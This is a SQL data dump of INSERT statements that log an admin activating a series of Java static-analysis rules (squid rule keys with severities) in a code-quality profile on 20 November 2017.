INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2828, '2017-11-20 12:19:12.774', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2274;ruleKey=squid:S2274;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj0GbbGRdfPp-rJw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2829, '2017-11-20 12:19:12.79', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2275;ruleKey=squid:S2275;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj0WbbGRdfPp-rJx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2830, '2017-11-20 12:19:12.805', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2276;ruleKey=squid:S2276;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj0lbbGRdfPp-rJy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2831, '2017-11-20 12:19:12.819', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2277;ruleKey=squid:S2277;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj0zbbGRdfPp-rJz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2832, '2017-11-20 12:19:12.834', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2278;ruleKey=squid:S2278;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj1CbbGRdfPp-rJ0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2833, '2017-11-20 12:19:12.917', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2293;ruleKey=squid:S2293;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj2VbbGRdfPp-rJ1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2834, '2017-11-20 12:19:12.945', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2326;ruleKey=squid:S2326;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj2xbbGRdfPp-rJ2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2835, '2017-11-20 12:19:12.958', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2386;ruleKey=squid:S2386;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj2-bbGRdfPp-rJ3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2836, '2017-11-20 12:19:12.993', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2387;ruleKey=squid:S2387;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj3hbbGRdfPp-rJ4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2837, '2017-11-20 12:19:13.029', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2388;ruleKey=squid:S2388;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj4FbbGRdfPp-rJ5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2838, '2017-11-20 12:19:13.061', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2390;ruleKey=squid:S2390;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj4lbbGRdfPp-rJ6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2839, '2017-11-20 12:19:13.081', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2391;ruleKey=squid:S2391;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj45bbGRdfPp-rJ7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2840, '2017-11-20 12:19:13.114', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2437;ruleKey=squid:S2437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj5abbGRdfPp-rJ8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2841, '2017-11-20 12:19:13.141', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2438;ruleKey=squid:S2438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj51bbGRdfPp-rJ9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2842, '2017-11-20 12:19:13.172', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2440;ruleKey=squid:S2440;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj6UbbGRdfPp-rJ-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2843, '2017-11-20 12:19:13.19', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2441;ruleKey=squid:S2441;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj6mbbGRdfPp-rJ_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2844, '2017-11-20 12:19:13.231', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2442;ruleKey=squid:S2442;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj7PbbGRdfPp-rKA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2845, '2017-11-20 12:19:13.26', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2445;ruleKey=squid:S2445;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj7sbbGRdfPp-rKB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2846, '2017-11-20 12:19:13.279', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2446;ruleKey=squid:S2446;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj7_bbGRdfPp-rKC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2847, '2017-11-20 12:19:13.306', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2447;ruleKey=squid:S2447;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj8abbGRdfPp-rKD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2848, '2017-11-20 12:19:13.326', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2583;ruleKey=squid:S2583;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj8ubbGRdfPp-rKE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2849, '2017-11-20 12:19:13.378', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2589;ruleKey=squid:S2589;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj9ibbGRdfPp-rKF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2850, '2017-11-20 12:19:13.437', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2629;ruleKey=squid:S2629;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj-dbbGRdfPp-rKG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2851, '2017-11-20 12:19:13.517', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2637;ruleKey=squid:S2637;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXj_tbbGRdfPp-rKH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2852, '2017-11-20 12:19:13.612', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2638;ruleKey=squid:S2638;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkBMbbGRdfPp-rKI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2853, '2017-11-20 12:19:13.699', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2639;ruleKey=squid:S2639;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkCjbbGRdfPp-rKJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2854, '2017-11-20 12:19:13.804', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2653;ruleKey=squid:S2653;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkEMbbGRdfPp-rKK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2855, '2017-11-20 12:19:13.84', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2674;ruleKey=squid:S2674;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkEwbbGRdfPp-rKL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2856, '2017-11-20 12:19:13.9', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2675;ruleKey=squid:S2675;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkFsbbGRdfPp-rKM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2857, '2017-11-20 12:19:13.928', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2676;ruleKey=squid:S2676;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkGIbbGRdfPp-rKN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2858, '2017-11-20 12:19:13.966', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2677;ruleKey=squid:S2677;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkGubbGRdfPp-rKO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2859, '2017-11-20 12:19:13.995', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2681;ruleKey=squid:S2681;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkHLbbGRdfPp-rKP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2860, '2017-11-20 12:19:14.053', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2692;ruleKey=squid:S2692;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkIFbbGRdfPp-rKQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2861, '2017-11-20 12:19:14.1', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2695;ruleKey=squid:S2695;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkI0bbGRdfPp-rKR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2862, '2017-11-20 12:19:14.133', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2696;ruleKey=squid:S2696;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkJVbbGRdfPp-rKS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2863, '2017-11-20 12:19:14.163', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2718;ruleKey=squid:S2718;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkJzbbGRdfPp-rKT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2864, '2017-11-20 12:19:14.192', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2737;ruleKey=squid:S2737;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkKQbbGRdfPp-rKU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2865, '2017-11-20 12:19:14.22', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2757;ruleKey=squid:S2757;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkKsbbGRdfPp-rKV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2866, '2017-11-20 12:19:14.238', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2786;ruleKey=squid:S2786;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkK-bbGRdfPp-rKW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2867, '2017-11-20 12:19:14.264', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2789;ruleKey=squid:S2789;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkLYbbGRdfPp-rKX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2868, '2017-11-20 12:19:14.281', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2864;ruleKey=squid:S2864;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkLpbbGRdfPp-rKY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2869, '2017-11-20 12:19:14.308', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2885;ruleKey=squid:S2885;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkMEbbGRdfPp-rKZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2870, '2017-11-20 12:19:14.326', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2886;ruleKey=squid:S2886;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkMWbbGRdfPp-rKa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2871, '2017-11-20 12:19:14.354', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2912;ruleKey=squid:S2912;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkMxbbGRdfPp-rKb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2872, '2017-11-20 12:19:14.382', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2924;ruleKey=squid:S2924;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkNObbGRdfPp-rKc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2873, '2017-11-20 12:19:14.406', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2925;ruleKey=squid:S2925;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkNmbbGRdfPp-rKd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2874, '2017-11-20 12:19:14.449', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2970;ruleKey=squid:S2970;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkORbbGRdfPp-rKe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2875, '2017-11-20 12:19:14.5', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2975;ruleKey=squid:S2975;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkPEbbGRdfPp-rKf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2876, '2017-11-20 12:19:14.561', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2976;ruleKey=squid:S2976;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkQBbbGRdfPp-rKg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2877, '2017-11-20 12:19:14.653', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3008;ruleKey=squid:S3008;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkRdbbGRdfPp-rKh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2878, '2017-11-20 12:19:14.693', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3010;ruleKey=squid:S3010;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkSFbbGRdfPp-rKi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2879, '2017-11-20 12:19:14.735', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3020;ruleKey=squid:S3020;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkSvbbGRdfPp-rKj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2880, '2017-11-20 12:19:14.775', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3027;ruleKey=squid:S3027;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkTXbbGRdfPp-rKk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2881, '2017-11-20 12:19:14.814', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3034;ruleKey=squid:S3034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkT-bbGRdfPp-rKl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2882, '2017-11-20 12:19:14.855', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3038;ruleKey=squid:S3038;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkUnbbGRdfPp-rKm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2883, '2017-11-20 12:19:14.895', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3042;ruleKey=squid:S3042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkVPbbGRdfPp-rKn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2884, '2017-11-20 12:19:14.93', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3046;ruleKey=squid:S3046;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkVybbGRdfPp-rKo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2885, '2017-11-20 12:19:14.947', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3066;ruleKey=squid:S3066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkWDbbGRdfPp-rKp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2886, '2017-11-20 12:19:14.972', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3067;ruleKey=squid:S3067;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkWcbbGRdfPp-rKq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2887, '2017-11-20 12:19:15.008', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3281;ruleKey=squid:S3281;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkXAbbGRdfPp-rKr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2888, '2017-11-20 12:19:15.034', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3346;ruleKey=squid:S3346;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkXabbGRdfPp-rKs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2889, '2017-11-20 12:19:15.057', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3355;ruleKey=squid:S3355;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkXxbbGRdfPp-rKt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2890, '2017-11-20 12:19:15.087', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3358;ruleKey=squid:S3358;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkYPbbGRdfPp-rKu');
